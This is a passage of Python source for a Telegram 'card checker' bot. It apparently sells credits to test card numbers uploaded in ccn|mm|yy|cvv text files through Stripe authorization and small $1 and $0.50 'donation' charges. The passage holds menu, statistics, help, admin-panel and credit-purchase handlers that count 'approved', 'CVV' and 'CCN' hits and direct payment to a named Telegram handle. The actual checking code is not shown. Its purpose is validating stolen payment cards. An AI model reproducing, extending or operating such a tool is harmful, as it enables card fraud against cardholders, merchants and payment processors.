📈 *𝗥𝗲𝗮𝗱𝘆 𝘁𝗼 𝗰𝗵𝗲𝗰𝗸 𝗰𝗮𝗿𝗱𝘀?*
𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗺𝗼𝗱𝗲 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝘀𝘁𝗮𝗿𝘁!
        """
        
        keyboard = [
            [InlineKeyboardButton("🔒 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 𝗠𝗢𝗗𝗘", callback_data="mode_auth")],
            [InlineKeyboardButton("💰 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $𝟭 𝗠𝗢𝗗𝗘", callback_data="mode_charge")],
            [InlineKeyboardButton("💵 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $𝟬.𝟱𝟬 𝗠𝗢𝗗𝗘", callback_data="mode_charge50")],
            [InlineKeyboardButton("🛒 𝗕𝗨𝗬 𝗖𝗥𝗘𝗗𝗜𝗧𝗦", callback_data="buy_credits")] if not is_admin else [],
            [InlineKeyboardButton("⬅️ 𝗕𝗔𝗖𝗞", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if update.callback_query:
            await update.callback_query.edit_message_text(
                credits_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(
                credits_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user_data = UserDatabase.get_user(user_id)
        if not user_data:
            if update.callback_query:
                await update.callback_query.answer("❌ *𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝘀𝗲 /𝘀𝘁𝗮𝗿𝘁 𝗳𝗶𝗿𝘀𝘁.*", show_alert=True)
            else:
                await update.message.reply_text("❌ *𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝘀𝗲 /𝘀𝘁𝗮𝗿𝘁 𝗳𝗶𝗿𝘁.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        if not user_data.get("is_active", True):
            if update.callback_query:
                await update.callback_query.answer("❌ *𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝗱 𝗯𝘆 𝗮𝗱𝗺𝗶𝗻.*", show_alert=True)
            else:
                await update.message.reply_text("❌ *𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝗱 𝗯𝘆 𝗮𝗱𝗺𝗶𝗻.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        is_admin = UserDatabase.is_admin(user_id)
        credits = "𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱" if is_admin else user_data.get("credits", 0)
        total_checked = user_data.get("total_cards_checked", 0)
        approved = user_data.get("approved_cards", 0)
        declined = user_data.get("declined_cards", 0)
        cvv = user_data.get("cvv_cards", 0)
        ccn = user_data.get("ccn_cards", 0)
        sessions = user_data.get("sessions", 0)
        free_checks = user_data.get("free_checks_available", 0)
        free_checks_used = user_data.get("free_checks_used", 0)
        
        approval_rate = (approved / total_checked * 100) if total_checked > 0 else 0
        
        created_at = user_data.get("created_at", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻")
        try:
            created_dt = datetime.fromisoformat(created_at)
            created_formatted = created_dt.strftime("%B %d, %Y")
        except:
            created_formatted = created_at
        
        free_checks_msg = ""
        if free_checks > 0:
            free_checks_msg = f"🎁 *𝗙𝗥𝗘𝗘 𝗖𝗛𝗘𝗖𝗞𝗦:* `{free_checks}` available\n"
        if free_checks_used > 0:
            free_checks_msg += f"📊 *𝗙𝗿𝗲𝗲 𝗰𝗵𝗲𝗰𝗸𝘀 𝘂𝘀𝗲𝗱:* `{free_checks_used}`\n"
        
        admin_msg = "\n👑 *𝗔𝗗𝗠𝗜𝗡:* Unlimited Credits!\n" if is_admin else ""
        
        stats_text = f"""
📊 *𝗨𝗦𝗘𝗥 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦*
        
👤 *𝗨𝘀𝗲𝗿:* @{update.effective_user.username or '𝗡/𝗔'}
🆔 *𝗜𝗗:* `{user_id}`
📅 *𝗠𝗲𝗺𝗯𝗲𝗿 𝗦𝗶𝗻𝗰𝗲:* `{created_formatted}`
        
💰 *𝗙𝗶𝗻𝗮𝗻𝗰𝗶𝗮𝗹:*
• 💳 *𝗖𝗿𝗲𝗱𝗶𝘁𝘀:* `{credits}`{admin_msg}{free_checks_msg}
📈 *𝗣𝗲𝗿𝗳𝗼𝗿𝗺𝗮𝗻𝗰𝗲:*
• 📊 *𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗱:* `{total_checked}`
• 🔥 *𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗖𝗮𝗿𝗱𝘀:* `{approved}`
• ✅ *𝗖𝗩𝗩 𝗖𝗮𝗿𝗱𝘀:* `{cvv}`
• ✅ *𝗖𝗖𝗡 𝗖𝗮𝗿𝗱𝘀:* `{ccn}`
• ❌ *𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 𝗖𝗮𝗿𝗱𝘀:* `{declined}`
• 📈 *𝗔𝗽𝗽𝗿𝗼𝘃𝗮𝗹 𝗥𝗮𝘁𝗲:* `{approval_rate:.1f}%`
        
🎯 *𝗔𝗰𝘁𝗶𝘃𝗶𝘁𝘆:*
• 🖥️ *𝗦𝗲𝘀𝘀𝗶𝗼𝗻𝘀:* `{sessions}`
• 🔄 *𝗔𝘃𝗲𝗿𝗮𝗴𝗲 𝗰𝗮𝗿𝗱𝘀/𝘀𝗲𝘀𝘀𝗶𝗼𝗻:* `{total_checked/sessions if sessions > 0 else 0:.1f}`
        """
        
        keyboard = [
            [InlineKeyboardButton("🔒 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 𝗠𝗢𝗗𝗘", callback_data="mode_auth")],
            [InlineKeyboardButton("💰 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $𝟭 𝗠𝗢𝗗𝗘", callback_data="mode_charge")],
            [InlineKeyboardButton("💵 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $𝟬.𝟱𝟬 𝗠𝗢𝗗𝗘", callback_data="mode_charge50")],
            [InlineKeyboardButton("🛒 𝗕𝗨𝗬 𝗖𝗥𝗘𝗗𝗜𝗧𝗦", callback_data="buy_credits")] if not is_admin else [],
            [InlineKeyboardButton("⬅️ 𝗕𝗔𝗖𝗞", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if update.callback_query:
            await update.callback_query.edit_message_text(
                stats_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(
                stats_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        user_data = UserDatabase.get_user(user_id)
        if not user_data or not user_data.get("is_active", True):
            if update.callback_query:
                await update.callback_query.answer("❌ *𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝗱 𝗯𝘆 𝗮𝗱𝗺𝗶𝗻.*", show_alert=True)
            else:
                await update.message.reply_text("❌ *𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝗱 𝗯𝘆 𝗮𝗱𝗺𝗶𝗻.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        help_text = """
🆘 *𝗛𝗘𝗟𝗣 & 𝗜𝗡𝗦𝗧𝗥𝗨𝗖𝗧𝗜𝗢𝗡𝗦 - 𝗙𝗜𝗡𝗔𝗟 𝗕𝗨𝗜𝗟𝗗*
        
🔒 *𝗧𝗥𝗜𝗣𝗟𝗘 𝗠𝗢𝗗𝗘𝗦 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘:*
• *𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵*: 𝗖𝗵𝗲𝗰𝗸𝘀 𝗶𝗳 𝗰𝗮𝗿𝗱 𝗰𝗮𝗻 𝗯𝗲 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 𝗮𝗰𝗰𝗼𝘂𝗻𝘁 (𝗻𝗼 𝗰𝗵𝗮𝗿𝗴𝗲)
• *𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟭*: 𝗔𝘁𝘁𝗲𝗺𝗽𝘁𝘀 $𝟭 𝗱𝗼𝗻𝗮𝘁𝗶𝗼𝗻 𝗰𝗵𝗮𝗿𝗴𝗲 𝘁𝗲𝘀𝘁
• *𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟬.𝟱𝟬*: 𝗔𝘁𝘁𝗲𝗺𝗽𝘁𝘀 $𝟬.𝟱𝟬 𝗱𝗼𝗻𝗮𝘁𝗶𝗼𝗻 𝗰𝗵𝗮𝗿𝗴𝗲 𝘁𝗲𝘀𝘁
        
📝 *𝗖𝗔𝗥𝗗 𝗙𝗢𝗥𝗠𝗔𝗧𝗦 𝗔𝗖𝗖𝗘𝗣𝗧𝗘𝗗:*
• `𝗰𝗰𝗻|𝗺𝗺|𝘆𝘆|𝗰𝘃𝘃`
• `𝗰𝗰𝗻|𝗺𝗺|𝘆𝘆𝘆𝘆|𝗰𝘃𝘃`
        
📁 *𝗙𝗜𝗟𝗘 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗠𝗘𝗡𝗧𝗦:*
• 📄 𝗧𝗲𝘅𝘁 𝗳𝗶𝗹𝗲 (.𝘁𝘅𝘁) 𝗼𝗻𝗹𝘆
• 📝 𝗢𝗻𝗲 𝗰𝗮𝗿𝗱 𝗽𝗲𝗿 𝗹𝗶𝗻𝗲
• ✅ 𝗡𝗢 𝗟𝗜𝗠𝗜𝗧𝗦
        
💳 *𝗖𝗥𝗘𝗗𝗜𝗧 𝗗𝗘𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗥𝗨𝗟𝗘𝗦:*
• 📝 *𝗔𝗡𝗬 𝗖𝗔𝗥𝗗 𝗖𝗛𝗘𝗖𝗞:* 𝟭 𝗳𝗿𝗲𝗲 𝗰𝗵𝗲𝗰𝗸 𝗼𝗿 𝟭 𝗰𝗿𝗲𝗱𝗶𝘁 (𝗱𝗲𝗱𝘂𝗰𝘁𝗲𝗱 𝗶𝗻𝘀𝘁𝗮𝗻𝘁𝗹𝘆)
• 🔥 *𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗖𝗔𝗥𝗗𝗦:* +𝟭 𝗮𝗱𝗱𝗶𝘁𝗶𝗼𝗻𝗮𝗹 𝗰𝗿𝗲𝗱𝗶𝘁 (𝗳𝗿𝗼𝗺 𝗮𝗱𝗺𝗶𝗻-𝗴𝗶𝘃𝗲𝗻 𝗰𝗿𝗲𝗱𝗶𝘁𝘀)
        
💰 *𝗛𝗼𝘄 𝘁𝗼 𝗴𝗲𝘁 𝗰𝗿𝗲𝗱𝗶𝘁𝘀:*
• 𝗨𝘀𝗲 /𝗯𝘂𝘆𝗰𝗿𝗲𝗱𝗶𝘁𝘀 𝘁𝗼 𝘀𝗲𝗲 𝗽𝗮𝗰𝗸𝗮𝗴𝗲𝘀
• 𝗦𝗲𝗻𝗱 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 𝘁𝗼 𝘁𝗵𝗲 𝗮𝗱𝗱𝗿𝗲𝘀𝘀𝗲𝘀
• 𝗦𝗲𝗻𝗱 𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗 𝘁𝗼 @𝗠𝗱𝗦𝗮𝗺𝗶𝗿𝟮𝟬𝟬𝟬
        
🎁 *??𝗥𝗘𝗘 𝗖𝗛𝗘𝗖𝗞𝗦:*
• 𝗙𝗶𝗿𝘀𝘁 𝗿𝗲𝗴𝘂𝗹𝗮𝗿 𝘂𝘀𝗲𝗿 𝗴𝗲𝘁𝘀 𝟭𝟬𝟬 𝗳𝗿𝗲𝗲 𝗰𝗵𝗲𝗰𝗸𝘀!
• 𝗙𝗿𝗲𝗲 𝗰𝗵𝗲𝗰𝗸𝘀 𝗮𝗿𝗲 𝘂𝘀𝗲𝗱 𝗳𝗶𝗿𝘀𝘁 𝗳𝗼𝗿 𝗔𝗡𝗬 𝗰𝗮𝗿𝗱 𝗰𝗵𝗲𝗰𝗸
        
📤 *𝗦𝗲𝗻𝗱 𝗮 𝗧𝗫𝗧 𝗳𝗶𝗹𝗲 𝗮𝗳𝘁𝗲𝗿 𝘀𝗲𝗹𝗲𝗰𝘁𝗶𝗻𝗴 𝗺𝗼𝗱𝗲!*
        """
    
        keyboard = [
            [InlineKeyboardButton("🔒 𝗦𝗘𝗟𝗘𝗖𝗧 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛", callback_data="mode_auth")],
            [InlineKeyboardButton("💰 𝗦𝗘𝗟𝗘𝗖𝗧 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $𝟭", callback_data="mode_charge")],
            [InlineKeyboardButton("💵 𝗦𝗘𝗟𝗘𝗖𝗧 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $𝟬.𝟱𝟬", callback_data="mode_charge50")],
            [InlineKeyboardButton("💳 𝗖𝗛𝗘𝗖𝗞 𝗖𝗥𝗘𝗗𝗜𝗧𝗦", callback_data="check_credits")],
            [InlineKeyboardButton("⬅️ 𝗕𝗔𝗖𝗞", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if update.callback_query:
            await update.callback_query.edit_message_text(
                help_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(
                help_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
    
    async def admin_panel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if not UserDatabase.is_admin(user_id):
            if update.callback_query:
                await update.callback_query.answer("❌ *𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱. 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆.*", show_alert=True)
            else:
                await update.message.reply_text("❌ *𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱. 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        all_users = UserDatabase.get_all_users()
        total_users = len(all_users)
        active_users = sum(1 for user in all_users.values() if user.get("is_active", True))
        total_credits = sum(user.get("credits", 0) for user in all_users.values() if not UserDatabase.is_admin(user.get("user_id")))
        
        admin_text = f"""
🛡️ *𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟*
        
📊 *𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦:*
• 👥 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: `{total_users}`
• ✅ 𝗔𝗰𝘁𝗶𝘃𝗲 𝗨𝘀𝗲𝗿𝘀: `{active_users}`
• 💰 𝗧𝗼𝘁𝗮𝗹 𝗖𝗿𝗲𝗱𝗶𝘁𝘀 𝗶𝗻 𝗦𝘆𝘀𝘁𝗲𝗺: `{total_credits}`
        
🔧 *𝗔𝗗𝗠𝗜𝗡 𝗔𝗖𝗧𝗜𝗢𝗡𝗦:*
        """
        
        keyboard = [
            [InlineKeyboardButton("👥 𝗩𝗜𝗘𝗪 𝗔𝗟𝗟 𝗨𝗦𝗘𝗥𝗦", callback_data="admin_view_users")],
            [InlineKeyboardButton("💰 𝗔𝗗𝗗 𝗖𝗥𝗘𝗗𝗜𝗧𝗦", callback_data="admin_add_credits")],
            [InlineKeyboardButton("📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘", callback_data="admin_broadcast")],
            [InlineKeyboardButton("🚫 𝗗𝗜𝗦𝗔𝗕𝗟𝗘 𝗨𝗦𝗘𝗥", callback_data="admin_disable_user")],
            [InlineKeyboardButton("✅ 𝗘𝗡𝗔𝗕𝗟𝗘 𝗨𝗦𝗘𝗥", callback_data="admin_enable_user")],
            [InlineKeyboardButton("💳 𝗩𝗜𝗘𝗪 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡𝗦", callback_data="admin_view_transactions")],
            [InlineKeyboardButton("📈 𝗩𝗜𝗘𝗪 𝗛𝗜𝗧𝗦", callback_data="admin_view_hits")],
            [InlineKeyboardButton("⬅️ 𝗕𝗔𝗖𝗞", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if update.callback_query:
            await update.callback_query.edit_message_text(
                admin_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(
                admin_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
    
    async def menu_bar_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        username = update.effective_user.username
        
        user_data = UserDatabase.get_user(user_id)
        if not user_data:
            user_data = UserDatabase.create_user(user_id, username)
        
        if not user_data.get("is_active", True):
            if update.callback_query:
                await update.callback_query.answer("❌ *𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝗱 𝗯𝘆 𝗮𝗱𝗺𝗶𝗻.*", show_alert=True)
            else:
                await update.message.reply_text("❌ *𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝗱 𝗯𝘆 𝗮𝗱𝗺𝗶𝗻.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        is_admin = UserDatabase.is_admin(user_id)
        credits = "𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱" if is_admin else user_data.get("credits", 0)
        free_checks = user_data.get("free_checks_available", 0)
        
        free_checks_msg = f"\n🎁 *𝗙𝗥𝗘𝗘 𝗖𝗛𝗘𝗖𝗞𝗦:* `{free_checks}`\n" if free_checks > 0 else "\n"
        
        menu_text = f"""
📋 *𝗤𝗨𝗜𝗖𝗞 𝗠𝗘𝗡𝗨 𝗕𝗔𝗥* 📋
    
👤 *𝗨𝘀𝗲𝗿:* @{username or '𝗡/𝗔'}
💳 *𝗖𝗿𝗲𝗱𝗶𝘁𝘀:* `{credits}`{free_checks_msg}
🛡️ *𝗥𝗼𝗹𝗲:* {'𝗔𝗱𝗺𝗶𝗻 👑' if is_admin else '𝗨𝘀𝗲𝗿'}
    
⚡ *𝗤𝗨𝗜𝗖𝗞 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:*
    
🔍 *𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗠𝗢𝗗𝗘𝗦:*
• /𝗺𝗼𝗱𝗲_𝗮𝘂𝘁𝗵 - 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗠𝗼𝗱𝗲
• /𝗺𝗼𝗱𝗲_𝟭 - 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟭 𝗠𝗼𝗱𝗲
• /𝗺𝗼𝗱𝗲_𝟱𝟬 - 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟬.𝟱𝟬 𝗠𝗼𝗱𝗲
    
📊 *𝗨𝗦𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:*
• /𝗰𝗿𝗲𝗱𝗶𝘁𝘀 - 𝗖𝗵𝗲𝗰𝗸 𝘆𝗼𝘂𝗿 𝗰𝗿𝗲𝗱𝗶𝘁𝘀
• /𝘀𝘁𝗮𝘁𝘀 - 𝗩𝗶𝗲𝘄 𝘆𝗼𝘂𝗿 𝘀𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗰𝘀
• /𝗯𝘂𝘆𝗰𝗿𝗲𝗱𝗶𝘁𝘀 - 𝗕𝘂𝘆 𝗺𝗼𝗿𝗲 𝗰𝗿𝗲𝗱𝗶𝘁𝘀
• /𝘁𝗿𝘅 <𝗶𝗱> - 𝗦𝗲𝗻𝗱 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗
    
📁 *𝗙𝗜𝗟𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚:*
• 𝗦𝗲𝗻𝗱 𝗮𝗻𝘆 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝘁𝗼 𝗰𝗵𝗲𝗰𝗸 𝗰𝗮𝗿𝗱𝘀
• /𝘀𝘁𝗼𝗽 - 𝗦𝘁𝗼𝗽 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗽𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴
    
🛡️ *𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:* {'(𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲)' if is_admin else '(𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆)'}
• /𝗮𝗱𝗺𝗶𝗻 - 𝗔𝗱𝗺𝗶𝗻 𝗽𝗮𝗻𝗲𝗹
• /𝗯𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 <𝗺𝘀𝗴> - 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗺𝗲𝘀𝘀𝗮𝗴𝗲
• /𝗮𝗱𝗱𝗰𝗿𝗲𝗱𝗶𝘁𝘀 <𝗶𝗱> <𝗮𝗺𝗼𝘂𝗻𝘁> - 𝗔𝗱𝗱 𝗰𝗿𝗲𝗱𝗶𝘁𝘀
• /𝘂𝘀𝗲𝗿𝘀 - 𝗩𝗶𝗲𝘄 𝗮𝗹𝗹 𝘂𝘀𝗲𝗿𝘀
• /𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝘂𝘀𝗲𝗿 <𝗶𝗱> - 𝗗𝗶𝘀𝗮𝗯𝗹𝗲 𝘂𝘀𝗲𝗿
• /𝗲𝗻𝗮𝗯𝗹𝗲𝘂𝘀𝗲𝗿 <𝗶𝗱> - 𝗘𝗻𝗮𝗯𝗹𝗲 𝘂𝘀𝗲𝗿
• /𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝘁𝗿𝘅 <𝗰𝗼𝗱𝗲> <𝗰𝗿𝗲𝗱𝗶𝘁𝘀> - 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻
    
❓ *𝗛𝗘𝗟𝗣:*
• /𝗵𝗲𝗹𝗽 - 𝗦𝗵𝗼𝘄 𝗵𝗲𝗹𝗽 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻
• /𝘀𝘁𝗮𝗿𝘁 - 𝗥𝗲𝘀𝘁𝗮𝗿𝘁 𝗯𝗼𝘁
    
📝 *𝗙𝗼𝗿𝗺𝗮𝘁:* `𝗰𝗰𝗻|𝗺𝗺|𝘆𝘆|𝗰𝘃𝘃`
📄 *𝗙𝗶𝗹𝗲:* 𝗦𝗲𝗻𝗱 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 𝗰𝗮𝗿𝗱𝘀
"""
        
        keyboard = [
            [InlineKeyboardButton("🔒 𝗔𝗨𝗧𝗛 𝗠𝗢𝗗𝗘", callback_data="mode_auth"),
             InlineKeyboardButton("💰 $𝟭 𝗠𝗢𝗗𝗘", callback_data="mode_charge"),
             InlineKeyboardButton("💵 $𝟬.𝟱𝟬 𝗠𝗢𝗗𝗘", callback_data="mode_charge50")],
            
            [InlineKeyboardButton("💳 𝗖𝗛𝗘𝗖𝗞 𝗖𝗥𝗘𝗗𝗜𝗧𝗦", callback_data="check_credits"),
             InlineKeyboardButton("📊 𝗨𝗦𝗘𝗥 𝗦𝗧𝗔𝗧𝗦", callback_data="user_stats")],
            
            [InlineKeyboardButton("🛒 𝗕𝗨𝗬 𝗖𝗥𝗘𝗗𝗜𝗧𝗦", callback_data="buy_credits")] if not is_admin else [],
            
            [InlineKeyboardButton("📁 𝗦𝗘𝗡𝗗 𝗖𝗔𝗥𝗗𝗦 𝗙𝗜𝗟𝗘", callback_data="upload")],
            
            [InlineKeyboardButton("🛡️ 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟", callback_data="admin_panel")] if is_admin else [],
            
            [InlineKeyboardButton("❓ 𝗛𝗘𝗟𝗣", callback_data="help"),
             InlineKeyboardButton("🏠 𝗛𝗢𝗠𝗘", callback_data="back_to_menu")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if update.callback_query:
            await update.callback_query.edit_message_text(
                menu_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
        elif update.message:
            await update.message.reply_text(
                menu_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
    
    async def buy_credits_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if UserDatabase.is_admin(user_id):
            if update.callback_query:
                await update.callback_query.answer(
                    "*👑 𝗔𝗱𝗺𝗶𝗻 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱!*\n\n"
                    "𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝘂𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗰𝗿𝗲𝗱𝗶𝘁𝘀. 𝗡𝗼 𝗻𝗲𝗲𝗱 𝘁𝗼 𝗯𝘂𝘆! 🚀",
                    show_alert=True
                )
            else:
                await update.message.reply_text(
                    "*👑 𝗔𝗱𝗺𝗶𝗻 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱!*\n\n"
                    "𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝘂𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗰𝗿𝗲𝗱𝗶𝘁𝘀. 𝗡𝗼 𝗻𝗲𝗲𝗱 𝘁𝗼 𝗯𝘂𝘆! 🚀",
                    parse_mode=ParseMode.MARKDOWN
                )
            return
        
        user_data = UserDatabase.get_user(user_id)
        free_checks = user_data.get("free_checks_available", 0) if user_data else 0
        
        free_checks_msg = f"\n🎁 *𝗙𝗥𝗘𝗘 𝗖𝗛𝗘𝗖𝗞𝗦:* `{free_checks}` available\n" if free_checks > 0 else ""
        
        # Updated pricing text
        packages_text = f"""
🛒 *𝗕𝗨𝗬 𝗖𝗥𝗘𝗗𝗜𝗧𝗦*{free_checks_msg}
        
*𝗖𝗿𝗲𝗱𝗶𝘁 𝗣𝗮𝗰𝗸𝗮𝗴𝗲𝘀:*
• 💰 *𝟭𝟬𝟬 𝗖𝗿𝗲𝗱𝗶𝘁𝘀* = `$𝟭`
• 💰 *𝟱𝟬𝟬 𝗖𝗿𝗲𝗱𝗶𝘁𝘀* = `$𝟰`
• 💰 *𝟭𝟬𝟬𝟬 𝗖𝗿𝗲𝗱𝗶𝘁𝘀* = `$𝟳`
        
*𝗛𝗼𝘄 𝘁𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲:*
𝟭. 𝗖𝗵𝗼𝗼𝘀𝗲 𝗮 𝗽𝗮𝗰𝗸𝗮𝗴𝗲 𝗯𝗲𝗹𝗼𝘄
𝟮. 𝗦𝗲𝗻𝗱 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 𝘁𝗼 𝗼𝗻𝗲 𝗼𝗳 𝘁𝗵𝗲 𝗮𝗱𝗱𝗿𝗲𝘀𝘀𝗲𝘀 𝗯𝗲𝗹𝗼𝘄
